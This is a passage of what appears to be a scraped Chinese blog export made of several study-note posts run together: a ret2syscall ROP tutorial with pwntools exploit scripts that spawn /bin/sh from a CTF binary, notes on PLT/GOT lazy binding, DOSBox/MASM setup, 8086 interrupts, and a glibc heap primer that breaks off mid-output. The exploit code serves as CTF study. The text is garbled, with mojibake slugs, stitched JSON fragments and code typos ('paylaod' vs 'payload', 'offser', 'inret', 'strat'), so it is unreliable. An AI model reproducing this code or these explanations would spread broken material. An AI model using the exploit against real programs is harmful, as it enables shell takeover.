ecx=0 edx=0 只需要让栈顶的值是0xb然后可以通过pop eax达到目的，要用ROPgadget来查找，使用命令找到pop eax： 1ROPgadget --binary rop --only 'pop|ret' | grep 'eax' 类似的，通过这条命令寻找控制其它寄存器的地址，找到可以控制多个的。同时使用找到字符串在什么地方 1ROPgadget --binary rop --string '/bin/sh' 以及还有需要的int 0x80 1ROPgadget --binary rop --only 'int' 类似的exp： 12345678910#!/usr/bin/env pythonfrom pwn import *p=process('./rop')int_addr=0x8049421bin_addr=0x80be408pop_other_ret=0x806eb90pop_eax_ret=0x80bb196paylaod='a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)p.sendline(payload)p.interactive() 或者 1234567891011#!/usr/bin/env pythonfrom pwn import *p=process('./rop')pop_eax_ret=0x80bb196pop_other_ret=0x806eb90int_addr=0x8049421bin_addr=0x80be408paylaod=flat(['a'*112,pop_eax_ret,0xb,pop_other_ret,0,0,bin_addr,int_addr])#flat模块能将patten字符串和地址结合并且转换为字节模式p.sendline(payload)p.interactive() 栈的布局就是： Low Address “A”*112 pop_eax_ret 0xb pop_edx_ecx_ebx_ret 0 0 /bin/sh int 0x80 High Address 动态链接PLT&amp;GOT以printf函数为例，运行时进行重定位是无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢。链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，就像下面那样，进行链接的时候只需要对printf_stub()经行重定位操作就可以 12345678910111213.text...;调用printf的call指令call printf_stub...printf_stub: mov rax,[printf函数的存储地址] ;获取printf重定位之后的地址 jmp rax;跳过去执行printf函数 .data...printf函数的存储地址，这里存储printf重定位后的地址 总体来说，动态链接每个函数需要两个东西： 用来存放外部函数地址的数据段 用来获取数据段记录的外部函数地址的代码 对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT，Global Offset Table），那个存放额外代码的表成为程序链接表（PLT，Procedure Link Table） 可执行文件里面保存的是PLT表的地址，对应PTL地址指向的是GOT的地址，GOT表指向的就是glibc中的地址。那我们可以发现，在这里面想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，Linux引入了延迟绑定机制 延迟绑定只有在动态库函数在被调用时，才会地址解析和重定位工作，为此可以用类似这样的代码来实现： 123456789//一开始没有重定位的时候将printf@got填成lookup_printf的地址void printf@got()&#123; address_good: jmp *printf@got lookup_printf: //调用重定位函数查找printf地址，并写到printf@got goto address_good;//再返回去执行address_good&#125; 说明一下这段代码工作流程，一开始printf@got是lookup_printf函数的地址，这个函数用来寻找printf()的地址，然后写入printf@got，lookup_printf执行完成后会返回到address_good，这样再jmp的话就可以直接跳到printf来执行了 也就是说，如果不知道printf的地址，就去找一下，知道的话就直接去jmp执行printf了 接下来，我们就来看一下这个”找”的工作是怎么实现的： 1234567891011121314151617Disassembly of section .plt:080482d0 &lt;common@plt&gt;: 80482d0: ff 35 04 a0 04 08 pushl 0x804a004 80482d6: ff 25 08 a0 04 08 jmp *0x804a008 80482dc: 00 00 add %al,(%eax) ...080482e0 &lt;puts@plt&gt;: 80482e0: ff 25 0c a0 04 08 jmp *0x804a00c 80482e6: 68 00 00 00 00 push $0x0 80482eb: e9 e0 ff ff ff jmp 80482d0 &lt;_init+0x28&gt;080482f0 &lt;__libc_start_main@plt&gt;: 80482f0: ff 25 10 a0 04 08 jmp *0x804a010 80482f6: 68 08 00 00 00 push $0x8 80482fb: e9 d0 ff ff ff jmp 80482d0 &lt;_init+0x28&gt; ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common 其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0 还记得之前我们说的，在还没有执行过函数之前printf@got的内容是lookup_printf函数的地址，这就是要去找printf函数的地址了 现在要做的是： 12push $0x0 ;将数据压到栈上，作为将要执行的函数的参数jmp 0x80482d0 ;去到了第一个表项 接下来继续 12345080482d0 &lt;common@plt&gt;:pushl 0x804a004 ;将数据压到栈上，作为后面函数的参数jmp *0x804a008 ;跳转到函数add %al,(%eax) ... 我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0 当执行后他有了值 这个值对应的函数是 _dl_runtime_resolve 那现在做一个小总结： 在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的 1xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve 到这里我们还需要知道 _dl_runtime_resolve 是怎么知道要查找 printf 函数的 _dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项 第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的id，告诉了_dl_runtime_resolve要去找哪一个函数的地址 在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 readelf -r test 命令可以查看 test 可执行文件中的重定位信息 这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来 第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址 在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存： got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址 got [1]：本 ELF 的 link_map 数据结构描述符地址 got [2]：_dl_runtime_resolve 函数的地址 动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项 跟着大佬的流程图来走一遍： 第一次调用 之后再次调用","categories":[],"tags":[]},{"title":"Win10-64bit下80x86汇编环境速成","slug":"Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔","date":"2020-02-12T08:57:29.000Z","updated":"2020-02-13T00:58:14.000Z","comments":true,"path":"2020/02/12/Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔/","link":"","permalink":"http://yoursite.com/2020/02/12/Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔/","excerpt":"","text":"众所周知Windows只有较为古老的32位系统才提供对16位系统的兼容，现在普遍安装的64位操作系统需要一个开源的模拟环境DOSBOX来进行16位DOS环境的汇编学习操作 工具包准备这里提供一个封装好所有必备工具的DOSBOX： 12链接：https://pan.baidu.com/s/1vuyNo9Benp9mXCIp5WM7Zg 提取码：o8jg 第一次双击该图标运行，就可以发现桌面生成了DOSBOX的快捷方式，点击运行即可进入 如果使用原版DOSBOX需要自行安装Link、MASM、DEBUG等程序： 12链接：https://pan.baidu.com/s/1S6bVvZA7dtISyoTTCyAawA 提取码：vke6 目录挂载原版DOSBOX在你的硬盘上规划一小块地方，专门作为dosbox的工作目录，比如，我的目录是D:/masm，然后你需要挂载工作目录并让dosbox每次启动时都挂载它，进入dosbox的安装目录，找到DOSBox 0.74 Options.bat文件，双击打开它，然后会看到一个txt文件，在文件末尾加入以下语句： 12mount d d:masm //标示将你硬盘的e:masm目录作为DOS系统的D盘，挂载到DOS系统上d: //表示切换到dos系统的D盘，实际上就是切换到你硬盘的 e:masm目录，就是你的工作目录 封装版DOSBOX每次运行DOSBOX我们都需要手动经行挂载，例如： 1234C:/&gt;mount e d:masmDrive E is mounted as local directory d:masm\\C:/&gt;E:E:/&gt; 就可进入我们的工作目录 编译-链接-运行我们以一个名称为2^3.asm的源代码为样本： 1234567assume cs:abcabc segmentstart: mov ax,2 add ax,ax add ax,ax abc endsend 首先运行masm生成obj文件，在DOS系统中可以用Tab键自动补齐 1E:\\CODE&gt;masm 2^3.ASM 然后一路回车就完事了，然后运行link经行程序链接 1E:\\CODE&gt;link 2^3.OBJ 就已经生成了EXE可执行文件，然后用debug调试运行 1E:\\CODE&gt;debug 2^3.EXE 使用t即可开始单步调试运行","categories":[],"tags":[]},{"title":"8086汇编笔记06","slug":"8086╗π▒α▒╩╝╟06","date":"2020-02-11T06:26:35.000Z","updated":"2020-02-11T22:26:50.000Z","comments":true,"path":"2020/02/10/8086╗π▒α▒╩╝╟06/","link":"","permalink":"http://yoursite.com/2020/02/10/8086╗π▒α▒╩╝╟06/","excerpt":"","text":"int指令int中断是一种重要的内中断，它的功能是引发中断过程。可以在程序中使用int指令调用任何一个中断的中断处理程序。可见int指令的最终功能和call指令相似，都是调用一段程序 因此一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用 我们在编程的时候，可以用int指令调用这些子程序。当然，也可以自己编写一些中断处理程序供别人使用。可以将中断处理程序简称为中断例程 1int n ;n为中断类型码 执行过程如下： 取中断类型码n 标志寄存器入栈，IF=0，TF=0 CS、IP入栈 (IP)=(n4)，(CS)=(n\\4+2) 从此转去执行n号中断的中断处理程序 例子一：安装程序 12345678910111213141516171819202122232425262728293031323334;编程：安装中断7ch的中断例程;功能：求一个word型数据的平方;参数：（ax）= 要计算的数据;返回值：dx、ax中存放结果的高16位和低16位assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset sqr ;设置ds:si指向源地址 mov ax,0 mov es,ax mov di,200h ;设置es:di指向目的地址 mov cx,offset sqrend - offset sqr ;设置cx为传输长度 cld ;设置传输方向为正 rep movsb mov ax,0 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21hsqr: mul ax inret ;pop IP pop CS popfsqrend: nopcode endsend start;编程实现求平方功能的程序;安装程序，我们将其安装在0:200处;设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程 调用测试程序 1234567891011assume cs:codecode segmentstart: mov ax,3456 int 7ch ;调用中断7ch的中断例程，计算ax中的数据的平方 add ax,ax adc dx,dx ;存放结果，将结果乘以2 mov ax,4c00h int 21hcode endsend start 例子二：安装程序： 12345678910111213141516171819202122232425262728293031323334353637assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset capital mov ax,0 mov es,ax mov di,200h mov cx,offset capitalend - offset capital cld rep movsb mov ax,0 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21hcapital: push cx push sichange: mov cl,[si] mov ch,0 jcxz ok and byte ptr [si],11011111b inc si jmp short changeok: pop si pop cx iret capitalend:nopcode endsend start 测试程序： 1234567891011121314assume cs:codedata segment db &apos;conversation&apos;,0data endscode segmentstart: mov ax,data mov ds,ax mov si,0 int 7ch mov ax,4c00h int 21hcode endsend start 这里主要是在中断例程capital中用到了寄存器si和cx，编写中断例程和编写子程序的时候具有同样的问题，就是要避免寄存器的冲突 总而言之就是要注意用到的寄存器的值的保存和恢复 使用bp代替sp例如： 123456789lp: push bp mov bp,sp dec cx jcxz lpret add [bp+2],bxlpret: pop bp iret 用bp寄存器保存调用前栈的sp，用bp代替sp，保证栈不容易被破坏，在结束函数调用后，弹出bp恢复sp BIOS和DOS中断例程的安装过程之前我们都是自己编写中断例程，将它们放在安装程序中，然后通过运行安装程序，将他们安装到指定的内存区中，此后，别的应用程序才可以调用，那BIOS和DOS提供的中断例程是如何安装到内存中的呢？ 开机后，CPU一加电，初始化(CS)=0FFFFH，(IP)=0，自动从FFFF:0单元开始执行程序。在FFFF:0处有一条跳转指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序 初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中 硬件系统检测和初始化完成后，调用int 19h经行操作系统的引导，从此将计算机交由操作系统控制 DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量 BIOS中断例程应用一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪个子程序。BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号 例如int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序 设置光标位置利用int 10h中断例程设置光标的位置功能： 12345mov ah,2 ;表示调用第10h号中断例程的2号子程序mov bh,0 ;设置光标到第0页mov dh,5 ;第5行mov dl,12 ;第12列int 10h (ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置，可以提供光标所在的行号（80*25字符模式下：024）、列号（80*25字符模式下：079），和页号作为参数 bh中页号的含义：在内存地址空间中，B8000h~BFFFFh共32K的空间，为80*25彩色字符模式的显示缓冲区 一屏的内容在现实缓冲区中共占4000个字节 也就是说，通常情况下，B8000h~BFF9Fh中的4000个字节的内容将出现在显示器上 显示字符123456mov ah,9 ;放置光标mov al,&apos;a&apos; ;字符mov bl,7 ;颜色属性mov bh,0 ;第0页mov cx,3 ;字符重复个数int 10h bl中的颜色属性格式如下： 7 6 5 4 3 2 1 0 BL R G B I R G B 闪烁 背景 背景 背景 高亮 前景 前景 前景 例如： 123456789101112131415161718192021;在屏幕的5行12列显示3个红底高亮闪烁绿色的&apos;a&apos;assume cs:codecode segmentstrat: mov ah,2 ;表示调用第10h号中断例程的2号子程序 mov bh,0 ;设置页 mov dh,5 ;ah中放行号 mov dl,12 ;dl中放列号 int 10h mov ah,9 ;放置光标 mov al,&apos;a&apos; ;字符 mov bl,11001010b ;颜色属性 mov bh,0 ;第0页 mov cx,3 ;字符重复个数 int 10h mov ax,4c00h int 21hcode endsend start DOS中断例程应用int 21h中断例程是DOS提供的中断例程，其中包括了DOS提供给程序员在编程时调用的子程序 程序返回我们从前一直使用的是int 21中断例程的4ch号功能，即程序返回功能，可以提供返回值作为参数： 123mov ah,4chmov al,0int 21h 我们一般合并写成： 12mov ax,4c00hint 21h 光标位置显示字符串(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数 123ds:ds指向字符串 ;要显示的字符串需用&quot;$&quot;作为结束符mov ah,9 ;功能号9，表示在光标位置显示字符串int 21h","categories":[],"tags":[]},{"title":"8086汇编笔记05","slug":"8086╗π▒α▒╩╝╟05","date":"2020-02-10T10:15:12.000Z","updated":"2020-02-11T02:15:30.000Z","comments":true,"path":"2020/02/10/8086╗π▒α▒╩╝╟05/","link":"","permalink":"http://yoursite.com/2020/02/10/8086╗π▒α▒╩╝╟05/","excerpt":"","text":"中断中断是CPU处理外部突发事件的一个重要技术，它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理，处理完成后又立即返回断点，继续进行CPU原来的工作。引起中断的原因或者说发出中断请求的来源叫做中断源。根据中断源的不同，可以把中断分为硬件中断和软件中断两大类，而硬件中断又可以分为外部中断和内部中断两类 CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是： 除法错、溢出中断、软件中断 不可屏蔽中断 可屏蔽中断 单步中断s 外部中断外部中断一般是指由计算机外设发出的中断请求，如：键盘中断、打印机中断、定时器中断等。外部中断使可以屏蔽的中断，也就是说，利用中断控制器可以屏蔽这些外部设备的中断请求 内部中断内部中断是指因硬件出错（突然掉电、奇偶校验错等）或运算出错（除数为零、运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断 软件中断软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H）等都是软件中断 中断处理程序CPU的设计者必须在中断信息和其处理程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序，比如CPU根据中断程序码4，就可以找到4号中断的处理程序 若要定位中断处理程序，需要知道它的段地址和偏移地址，如果需要根据8位的中断类型码（8086中断类型码为一个字节）得到中断处理程序的段地址和偏移地址，需要引入“中断向量表” 中断向量表CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址，中断向量表就是中断向量的列表 0号中断元对应的中断处理程序的入口地址 1号中断元对应的中断处理程序的入口地址 2号中断元对应的中断处理程序的入口地址 …… 中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口。对于8086PC机，中断向量表指定放在内存地址0处，从内存0000:0000到0000:03FF的1024个单元 中断过程CPU硬件完成中断工作的过程被称为中断过程： 利用中断类型码，在中断向量表中找到中断处理程序的入口 找到这个入口地址的最终目的是用它设置CS和IP，使CPU执行中断处理程序 用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的 8086CPU的中断过程： 从中断信息中取得中断类型码 标志寄存器的值入栈（保护标志位） 设置标志寄存器的第8位TF和第9位IF的值为0 CS的内容入栈 IP的内容入栈 从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS 1234561.取得中断类型码N；2.pushf3.TF=0，IF=04.push CS5.push IP6.(IP)=(N*4)，(CS)=(N*4+2) 中断处理程序由于CPU随时都可能检测到中断信息，也就是说，CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中，而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中 中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤： 保存用到的寄存器 处理中断 恢复用到的寄存器 用iret指令返回 iret指令的功能用汇编语法描述为： pop IP pop CS popf iret通常和硬件自动完成的中断过程配合使用 可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU现场恢复标志寄存器和CS、IP的工作 除法错误中断的处理当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，然后引发中断过程，转去执行0号中断所对应的中断处理程序 编程处理0号中断 当发生除法溢出的时候，产生0号中断信息，从而引发中断过程，此时CPU经行以下工作 取得中断类型码0 标志寄存器入栈，TF、IF设置为0 CS、IP入栈 (IP)=(04)，(CS)=(0\\4+2) 可见当中断0发生时，CPU将去执行处理程序，要显示特定字符串只需这样写： 相关处理 向显示缓冲区送字符串”Welcome to” 返回DOS 必须将do 0 的入口地址等级在中断向量表的对应表项中，因为除法溢出对应的中断类型码为0则： 入口地址应该从0x4地址单元开始存放 段地址存放在0x4+2字单元中 偏移地址存放在0x4字单元中 总结上面的分析： 编写可以显示字符串的中断处理程序：do 0 将do 0送入内存0000:0200处 将do 0的入口地址0000:0200存储在中断向量表0号表项中 普通的示例： 123456789101112131415161718192021222324252627282930313233343536assume cs:codedata segment db &quot;Hello World!&quot;data endscode segmentstart: mov ax,cs mov ds,ax mov si,offser dp0 ;设置ds:si指向源地址 mov ax,0 mov es,ax mov di,200h ;设置es:di指向目的地址 mov cx,offset do0end- offset do0 ;设置cx为传输长度 cld ;设置传输方向为正 rep movsb mov ax,0;设置中断向量表 mov es,ax mov word ptr es:[0*4],200h mov word ptr es:[0*4+2],0 mov ax,4c00h int 21hdo0: ;显示字符串 mov ax,data mov ds,ax mov si,0 ;设置ds:si指向字符串 mov ax,0b800h mov es,ax mov di,12*160+36*2 ;设置es:di指向显存空间的中间位置 mov cx,21 ;设置cx为字符串长度doend: nopcode endsend start;&quot;-&quot;是编译器可以识别的运算符号，两个常数的减法，编译器还可以处理很多表达式 但是这样有一个问题，字符串存放在程序的data段中。程序执行完成后返回，它所占用的内存空间被系统释放，而在其中存放的字符串也将很可能被别的信息覆盖，很难保证do0程序从原来程序program1所处的空间中取得的是要显示的字符串。所以该字符串也应该存放在一段不会被覆盖的空间中 所以，改进后将数据存放到代码段中： 1234567891011121314151617181920212223242526272829303132333435assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offser dp0 ;设置ds:si指向源地址 mov ax,0 mov es,ax mov di,200h ;设置es:di指向目的地址 mov cx,offset do0end- offset do0 ;设置cx为传输长度 cld ;设置传输方向为正 rep movsb mov ax,0;设置中断向量表 mov es,ax mov word ptr es:[0*4],200h mov word ptr es:[0*4+2],0 mov ax,4c00h int 21hdo0: jmp short do0start db &quot;Hello World&quot; ;将数据存放在代码段do0start: mov ax,cs mov ds,ax mov si,202h ;设置ds:si指向字符串 mov ax,0b800h mov es,ax mov di,12*160+36*2 ;设置es:di指向显存空间的中间位置 mov cx,21 ;设置cx为字符串长度doend: nopcode endsend start 单步中断只有CPU提供了在执行一条指令后就转去做其他事情的能力，Debug或是其他的程序才能利用CPU提供的这种功能做出我们使用T命令时的效果 CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发终端过程 单步中断的中断类型码为1，则它所引发的中断过程如下： 取得中断类型码1 标志寄存器入栈，TF、IF设置为0 CS、IP入栈 (IP)=(14),(CS)=(1\\4+2) 所以如果TF=1，则执行一条指令后，CPU就要转去执行1号中断处理程序 在使用T命令执行指令时，Debug将TF设置为1，使得CPU在工作于单步中断方式下，则在CPU执行完这条指令后就引发单步中断，执行单步中断的中断处理程序，所有寄存器中的内容被显示在屏幕上，并且等待输入命令 响应中断的特殊情况在有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应 在执行完向ss寄存器传送数据的指令后这样做的主要原因是ss:sp联合指向栈，而对它们的设置应该连续完成，因为如果在执行完设置ss的指令后，没设置sp寄存器，CPU响应中断的话，压栈标志寄存器、CS和IP的值，ss:sp指向的不是正确的栈顶，将引起错误 我们应该利用这个特性，将设置ss和sp的指令连续存放，之间CPU不会引发中断过程","categories":[],"tags":[]},{"title":"简明堆入门","slug":"╝≥├≈╢╤╚δ├┼","date":"2020-02-08T07:56:29.000Z","updated":"2020-02-08T23:57:08.000Z","comments":true,"path":"2020/02/07/╝≥├≈╢╤╚δ├┼/","link":"","permalink":"http://yoursite.com/2020/02/07/╝≥├≈╢╤╚δ├┼/","excerpt":"","text":"malloc1void *ptr = malloc(0x10) 系统会调用一些函数在内存中开辟一大片空间作为堆的分配使用空间 malloc函数再从这一片堆的分配使用空间中分配0x10大小的空间，将指向该空间的地址返回给ptr(系统分配未使用余下的空间称为topchunk) malloc_chunk我们称运行过程中被malloc分配的内存为一个chunk，这块内存在ptmalloc中用malloc_chunk结构体表示，当程序申请的chunk被free时，会被加入相应的空闲管理列表中 1234567891011121314struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ /* fd = Forward pointer to next chunk bk = Back pointer to previous chunk */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; prev_size：如果前一个chunk是空闲的，该域表示前一个chunk的大小，如果前一个chunk不空闲，该域无意义，被前一个chunk占用复用 size：当前chunk的大小，并且记录了当前chunk和前一个chunk的一些属性，二进制后三位是标志位 FD：记录了下一个被free的chunk（used only if free） BK：记录了上一个被free的chunk（used only if free） fd_nextsize和bk_nextsize，只在largebin使用，记录了上/下一个被free chunk的size chunk是有他的神奇之处的，chunk虽然由一个统一的结构体声明，但是在被使用时和空闲时却又有两种不同的状态 使用中的chunk 123456789101112chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 空闲中的chunk（被free后） 123456789101112131415chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ chunk的复用技术chunk中的字段prev_size是可以复用的： 如果前一个邻接的chunk块空闲，那么当前chunk块结构体内的prev_size字段记录的是前一个邻接chunk块的大小。这就是由当前chunk指针获得前一个空闲chunk地址的依据。宏prev_chunk(p)就是依赖这个假设实现的 获得前一个chunk的地址：当前chunk的地址 - prev_size 如果前一个邻接chunk在使用中，则当前chunk的prev_size的空间被前一个chunk借用中，其中的值是前一个chunk的内存内容，对当前chunk没有任何意义 使用中的chunk123456789101112chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 在size字段中最后三位有AMP三个标志位，但是在结构体中却没有定义，我们当前只需要记住P标志位 PREV_INUSE：记录前一个chunk块是否被分配 ptmalloc使用chunk实现内存管理，对chunk的管理基于独特的边界标记法。最重要的是地址的对齐。在不同的平台下，每个chunk的最小大小，地址对齐方式是不同的（地址对齐：即需要满足某个字节大小的整数倍，提高效率），ptmalloc依赖平台定义的size_t长度，对于32位平台，size_t长度为4字节，对于64位平台，size_t长度可能为4字节，也可能为8字节，在Linux X86_64上为8字节（做题常用环境） 在64位平台下，一个使用中的chunk的大小的计算公式应该是： in_use_size =（用户请求大小+16byte-8byte）align to 8byte 这里的16字节是因为需要存储prev_size和size域，但又因为向下一个chunk“借”了8字节（也就是prev_size域的复用），所以实际空间大小要减去8字节，每分配一个chunk的overhead为8字节，即SIZE_SZ的大小 ptmalloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10 or 4*8），即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和，这样换用二进制就是100000，size字段的低三位就永远不会被使用，低三位就被用来当作flag位 堆的释放1free(ptr); 堆的释放一般都是用free函数实现。堆释放后，会被添加到相应的bins中进行管理，这里涉及到的结构体就是malloc_state 12345678910111213141516171819202122232425struct malloc_state &#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags;#if THREAD_STATS /* Statistics for locking. Only used if THREAD_STATS is defined. */ long stat_lock_direct, stat_lock_loop, stat_lock_wait;#endif /* Fastbins */ mfastbinptr fastbins[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 对于空闲的chunk，ptmalloc采用分箱式内存管理方式，根据空闲的chunk的大小和处于的状态将其放在四个不同的bin中，这四个空闲的chunk的容器包括：fast bins，unsort bin、small bins和large bins Bins首先，glibc malloc分配了若干个bins，为了方便查找了，glibc提供了两个数组：fastbinY和binsBins，英文解释是垃圾桶，在这里就存放被free的chunk fastbinsY是拥有10（NFASTBINS）个元素的数组，用于存放每个fast chunk链表头指针，所以fast bins最多包含10个fast chunk的单向链表 bins用于存储unstored bin，small bins和large bins的chunk链表头，small bins一共62个，large bins一共63个，加起来一共125个bin，是双向链表管理 fastbins首先编写下面程序： 1234567891011121314#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; void *ptr1,*ptr2,*ptr3,*ptr4; ptr1 = malloc(0x10); ptr2 = malloc(0x10); ptr3 = malloc(0x10); ptr4 = malloc(0x10); free(ptr1); free(ptr2); free(ptr3); free(ptr4); return 0;&#125; GDB调试可得： 12345678910111213141516171819202122232425262728293031320x555555756250 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21&#125;0x555555756270 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x555555756260, bk = 0x0, fd_nextsize = 0x0, 